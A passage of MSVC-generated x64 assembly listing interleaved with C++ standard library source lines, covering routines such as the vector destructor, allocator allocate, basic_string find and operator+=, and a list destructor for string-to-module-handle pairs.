	call	??$_Free_non_head@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Free_non_head<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, QWORD PTR [rbx]
	mov	edx, 56					; 00000038H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1053 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	jmp	??3@YAXPEAX_K@Z				; operator delete
??1?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEAA@XZ ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::~list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Xlength@?$vector@PEBDV?$allocator@PEBD@std@@@std@@CAXXZ
_TEXT	SEGMENT
?_Xlength@?$vector@PEBDV?$allocator@PEBD@std@@@std@@CAXXZ PROC ; std::vector<char const *,std::allocator<char const *> >::_Xlength, COMDAT

; 2141 :     [[noreturn]] static void _Xlength() {

$LN4:
	sub	rsp, 40					; 00000028H

; 2142 :         _Xlength_error("vector too long");

	lea	rcx, OFFSET FLAT:??_C@_0BA@FOIKENOD@vector?5too?5long@
	call	?_Xlength_error@std@@YAXPEBD@Z		; std::_Xlength_error
	int	3
$LN3@Xlength:
?_Xlength@?$vector@PEBDV?$allocator@PEBD@std@@@std@@CAXXZ ENDP ; std::vector<char const *,std::allocator<char const *> >::_Xlength
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Tidy@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAXXZ
_TEXT	SEGMENT
this$ = 48
?_Tidy@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAXXZ PROC ; std::vector<char const *,std::allocator<char const *> >::_Tidy, COMDAT

; 2039 :     _CONSTEXPR20 void _Tidy() noexcept { // free all storage

$LN31:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 2040 :         auto& _Al         = _Getal();
; 2041 :         auto& _My_data    = _Mypair._Myval2;
; 2042 :         pointer& _Myfirst = _My_data._Myfirst;
; 2043 :         pointer& _Mylast  = _My_data._Mylast;
; 2044 :         pointer& _Myend   = _My_data._Myend;
; 2045 : 
; 2046 :         _My_data._Orphan_all();
; 2047 : 
; 2048 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rcx, QWORD PTR [rcx]
	test	rcx, rcx
	je	SHORT $LN2@Tidy

; 2049 :             _STD _Destroy_range(_Myfirst, _Mylast, _Al);
; 2050 :             _ASAN_VECTOR_REMOVE;
; 2051 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rdx, QWORD PTR [rbx+16]
	sub	rdx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	and	rdx, -8

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN21@Tidy

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN18@Tidy

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN21@Tidy:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2053 :             _Myfirst = nullptr;

	xor	eax, eax
	mov	QWORD PTR [rbx], rax

; 2054 :             _Mylast  = nullptr;

	mov	QWORD PTR [rbx+8], rax

; 2055 :             _Myend   = nullptr;

	mov	QWORD PTR [rbx+16], rax
$LN2@Tidy:

; 2057 :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN18@Tidy:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN28@Tidy:
?_Tidy@?$vector@PEBDV?$allocator@PEBD@std@@@std@@AEAAXXZ ENDP ; std::vector<char const *,std::allocator<char const *> >::_Tidy
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ??1?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@XZ PROC ; std::vector<char const *,std::allocator<char const *> >::~vector<char const *,std::allocator<char const *> >, COMDAT

; 760  :     _CONSTEXPR20 ~vector() noexcept {

$LN35:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rcx

; 2048 :         if (_Myfirst) { // destroy and deallocate old array

	mov	rcx, QWORD PTR [rcx]
	test	rcx, rcx
	je	SHORT $LN5@vector

; 2049 :             _STD _Destroy_range(_Myfirst, _Mylast, _Al);
; 2050 :             _ASAN_VECTOR_REMOVE;
; 2051 :             _Al.deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

	mov	rdx, QWORD PTR [rbx+16]
	sub	rdx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	and	rdx, -8

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN24@vector

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN21@vector

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN24@vector:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 2053 :             _Myfirst = nullptr;

	xor	eax, eax
	mov	QWORD PTR [rbx], rax

; 2054 :             _Mylast  = nullptr;

	mov	QWORD PTR [rbx+8], rax

; 2055 :             _Myend   = nullptr;

	mov	QWORD PTR [rbx+16], rax
$LN5@vector:

; 766  :     }

	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN21@vector:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN32@vector:
??1?$vector@PEBDV?$allocator@PEBD@std@@@std@@QEAA@XZ ENDP ; std::vector<char const *,std::allocator<char const *> >::~vector<char const *,std::allocator<char const *> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?allocate@?$allocator@PEBD@std@@QEAAPEAPEBD_K@Z
_TEXT	SEGMENT
this$dead$ = 48
_Count$ = 56
?allocate@?$allocator@PEBD@std@@QEAAPEAPEBD_K@Z PROC	; std::allocator<char const *>::allocate, COMDAT

; 953  :     _NODISCARD_RAW_PTR_ALLOC _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

$LN34:
	sub	rsp, 40					; 00000028H

; 84   :         if (_Count > _Max_possible) {

	mov	rax, 2305843009213693951		; 1fffffffffffffffH
	cmp	rdx, rax
	ja	SHORT $LN30@allocate

; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	lea	rcx, QWORD PTR [rdx*8]

; 196  :     if (_Bytes == 0) {

	test	rcx, rcx
	jne	SHORT $LN8@allocate

; 197  :         return nullptr;

	xor	eax, eax

; 954  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 955  :         return static_cast<_Ty*>(_STD _Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));
; 956  :     }

	add	rsp, 40					; 00000028H
	ret	0
$LN8@allocate:

; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN10@allocate

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	SHORT $LN30@allocate

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	SHORT $LN20@allocate

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 954  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 955  :         return static_cast<_Ty*>(_STD _Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));
; 956  :     }

	add	rsp, 40					; 00000028H
	ret	0
$LN10@allocate:
	add	rsp, 40					; 00000028H

; 101  :         return ::operator new(_Bytes);

	jmp	??2@YAPEAX_K@Z				; operator new
$LN30@allocate:

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN20@allocate:

; 156  :     }
; 157  : 
; 158  :     const uintptr_t _Ptr_container = reinterpret_cast<uintptr_t>(_Traits::_Allocate(_Block_size));
; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN32@allocate:
?allocate@?$allocator@PEBD@std@@QEAAPEAPEBD_K@Z ENDP	; std::allocator<char const *>::allocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z
_TEXT	SEGMENT
this$ = 64
_Right$ = 72
_Off$dead$ = 80
?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::find, COMDAT

; 4390 :     _NODISCARD _CONSTEXPR20 size_type find(const basic_string& _Right, const size_type _Off = 0) const noexcept {

$LN52:
	push	rbp
	push	rsi
	push	rdi
	sub	rsp, 32					; 00000020H

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 4390 :     _NODISCARD _CONSTEXPR20 size_type find(const basic_string& _Right, const size_type _Off = 0) const noexcept {

	mov	rdi, rdx

; 4391 :         // look for _Right beginning at or after _Off
; 4392 :         return static_cast<size_type>(_Traits_find<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize, _Off,

	mov	rbp, QWORD PTR [rdx+16]
	mov	rsi, rcx

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN5@find

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdi, QWORD PTR [rdx]
$LN5@find:

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rcx+24], 15

; 4391 :         // look for _Right beginning at or after _Off
; 4392 :         return static_cast<size_type>(_Traits_find<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize, _Off,

	mov	rax, QWORD PTR [rcx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN12@find

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rsi, QWORD PTR [rcx]
$LN12@find:

; 575  :     if (_Needle_size > _Hay_size || _Start_at > _Hay_size - _Needle_size) {

	cmp	rbp, rax
	ja	$LN23@find
	sub	rax, rbp

; 576  :         // xpos cannot exist, report failure
; 577  :         // N4950 [string.view.find]/3 says:
; 578  :         // 1. _Start_at <= xpos
; 579  :         // 2. xpos + _Needle_size <= _Hay_size;
; 580  :         // therefore:
; 581  :         // 3. _Needle_size <= _Hay_size (by 2) (checked above)
; 582  :         // 4. _Start_at + _Needle_size <= _Hay_size (substitute 1 into 2)
; 583  :         // 5. _Start_at <= _Hay_size - _Needle_size (4, move _Needle_size to other side) (also checked above)
; 584  :         return static_cast<size_t>(-1);
; 585  :     }
; 586  : 
; 587  :     if (_Needle_size == 0) { // empty string always matches if xpos is possible

	test	rbp, rbp
	jne	SHORT $LN24@find

; 4391 :         // look for _Right beginning at or after _Off
; 4392 :         return static_cast<size_type>(_Traits_find<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize, _Off,

	xor	eax, eax

; 4393 :             _Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize));
; 4394 :     }

	add	rsp, 32					; 00000020H
	pop	rdi
	pop	rsi
	pop	rbp
	ret	0
$LN24@find:
	mov	QWORD PTR [rsp+64], rbx

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	mov	rcx, rsi
	mov	QWORD PTR [rsp+72], r14

; 591  :     const auto _Possible_matches_end = _Haystack + (_Hay_size - _Needle_size) + 1;

	lea	r14, QWORD PTR [rax+rsi]
	mov	QWORD PTR [rsp+80], r15

; 592  :     for (auto _Match_try = _Haystack + _Start_at;; ++_Match_try) {
; 593  :         _Match_try = _Traits::find(_Match_try, static_cast<size_t>(_Possible_matches_end - _Match_try), *_Needle);

	lea	r8, QWORD PTR [r14+1]

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	movsx	r15d, BYTE PTR [rdi]

; 593  :         _Match_try = _Traits::find(_Match_try, static_cast<size_t>(_Possible_matches_end - _Match_try), *_Needle);

	sub	r8, rsi

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	mov	edx, r15d
	call	memchr
	mov	rbx, rax

; 594  :         if (!_Match_try) { // didn't find first character; report failure

	test	rax, rax
	je	SHORT $LN36@find
	npad	10
$LL21@find:

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	r8, rbp
	mov	rdx, rdi
	mov	rcx, rbx
	call	memcmp

; 598  :         if (_Traits::compare(_Match_try, _Needle, _Needle_size) == 0) { // found match

	test	eax, eax
	je	SHORT $LN37@find

; 592  :     for (auto _Match_try = _Haystack + _Start_at;; ++_Match_try) {
; 593  :         _Match_try = _Traits::find(_Match_try, static_cast<size_t>(_Possible_matches_end - _Match_try), *_Needle);

	inc	rbx
	lea	r8, QWORD PTR [r14+1]
	sub	r8, rbx

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	mov	rcx, rbx
	mov	edx, r15d
	call	memchr
	mov	rbx, rax

; 594  :         if (!_Match_try) { // didn't find first character; report failure

	test	rax, rax
	jne	SHORT $LL21@find
$LN36@find:

; 4391 :         // look for _Right beginning at or after _Off
; 4392 :         return static_cast<size_type>(_Traits_find<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize, _Off,

	mov	rax, -1
$LN49@find:
	mov	r14, QWORD PTR [rsp+72]
	mov	rbx, QWORD PTR [rsp+64]
	mov	r15, QWORD PTR [rsp+80]

; 4393 :             _Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize));
; 4394 :     }

	add	rsp, 32					; 00000020H
	pop	rdi
	pop	rsi
	pop	rbp
	ret	0
$LN37@find:

; 599  :             return static_cast<size_t>(_Match_try - _Haystack);

	sub	rbx, rsi

; 4391 :         // look for _Right beginning at or after _Off
; 4392 :         return static_cast<size_type>(_Traits_find<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize, _Off,

	mov	rax, rbx

; 599  :             return static_cast<size_t>(_Match_try - _Haystack);

	jmp	SHORT $LN49@find
$LN23@find:

; 4391 :         // look for _Right beginning at or after _Off
; 4392 :         return static_cast<size_type>(_Traits_find<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize, _Off,

	mov	rax, -1

; 4393 :             _Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize));
; 4394 :     }

	add	rsp, 32					; 00000020H
	pop	rdi
	pop	rsi
	pop	rbp
	ret	0
?find@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEBA_KAEBV12@_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::find
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Unchecked_end@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 8
?_Unchecked_end@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAPEADXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Unchecked_end, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rcx+24], 15

; 2226 :         value_type* _Result = _Bx._Buf;

	mov	rdx, rcx

; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN5@Unchecked_

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rcx]
$LN5@Unchecked_:

; 3987 :         return _Mypair._Myval2._Myptr() + _Mypair._Myval2._Mysize;

	mov	rax, QWORD PTR [rcx+16]
	add	rax, rdx

; 3988 :     }

	ret	0
?_Unchecked_end@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAPEADXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Unchecked_end
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Unchecked_begin@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAPEADXZ
_TEXT	SEGMENT
this$ = 8
?_Unchecked_begin@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAPEADXZ PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Unchecked_begin, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rcx+24], 15

; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN11@Unchecked_

; 3979 :         return _Mypair._Myval2._Myptr();

	mov	rax, QWORD PTR [rcx]

; 3980 :     }

	ret	0
$LN11@Unchecked_:

; 3979 :         return _Mypair._Myval2._Myptr();

	mov	rax, rcx

; 3980 :     }

	ret	0
?_Unchecked_begin@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAPEADXZ ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Unchecked_begin
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z
_TEXT	SEGMENT
this$ = 48
_Ch$ = 56
??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=, COMDAT

; 3274 :     _CONSTEXPR20 basic_string& operator+=(_Elem _Ch) {

$LN18:
	push	rbx
	sub	rsp, 32					; 00000020H

; 4087 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

	mov	r8, QWORD PTR [rcx+16]

; 3274 :     _CONSTEXPR20 basic_string& operator+=(_Elem _Ch) {

	mov	rbx, rcx

; 4088 :         if (_Old_size < _Mypair._Myval2._Myres) {

	mov	r9, QWORD PTR [rcx+24]
	cmp	r8, r9
	jae	SHORT $LN4@operator

; 4089 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + 1);
; 4090 :             _Mypair._Myval2._Mysize = _Old_size + 1;

	lea	rcx, QWORD PTR [r8+1]

; 2226 :         value_type* _Result = _Bx._Buf;

	mov	rax, rbx

; 4090 :             _Mypair._Myval2._Mysize = _Old_size + 1;

	mov	QWORD PTR [rbx+16], rcx

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r9, 15

; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN7@operator

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rbx]
$LN7@operator:

; 4092 :             _Traits::assign(_Ptr[_Old_size], _Ch);

	mov	BYTE PTR [rax+r8], dl

; 4093 :             _Traits::assign(_Ptr[_Old_size + 1], _Elem());

	mov	BYTE PTR [rax+r8+1], 0

; 3275 :         push_back(_Ch);
; 3276 :         return *this;
; 3277 :     }

	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN4@operator:

; 4097 :         _Reallocate_grow_by(

	movzx	r9d, dl
	call	??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<`std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back'::`2'::<lambda_1>,char>

; 3275 :         push_back(_Ch);
; 3276 :         return *this;
; 3277 :     }

	mov	rax, rbx
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
??Y?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAV01@D@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator+=
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@$$QEAV01@@Z
_TEXT	SEGMENT
this$ = 8
_Right$ = 16
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@$$QEAV01@@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >, COMDAT

; 2308 :     size_type _Mysize = 0; // current length of string (size)

	xor	eax, eax
	xorps	xmm0, xmm0

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

	movups	XMMWORD PTR [rcx], xmm0

; 2308 :     size_type _Mysize = 0; // current length of string (size)

	mov	QWORD PTR [rcx+16], rax

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

	mov	QWORD PTR [rcx+24], rax

; 3083 :                 _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

	movups	xmm0, XMMWORD PTR [rdx]
	movups	XMMWORD PTR [rcx], xmm0
	movups	xmm1, XMMWORD PTR [rdx+16]
	movups	XMMWORD PTR [rcx+16], xmm1

; 2820 :         _Mypair._Myval2._Alloc_proxy(_GET_PROXY_ALLOCATOR(_Alty, _Getal()));
; 2821 :         _Take_contents(_Right);
; 2822 :     }

	mov	QWORD PTR [rdx+16], rax
	mov	QWORD PTR [rdx+24], 15
	mov	BYTE PTR [rdx], al
	mov	rax, rcx
	ret	0
??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@$$QEAV01@@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ?pointer_to@?$pointer_traits@PEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@SAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@2@AEAU32@@Z
_TEXT	SEGMENT
_Val$ = 8
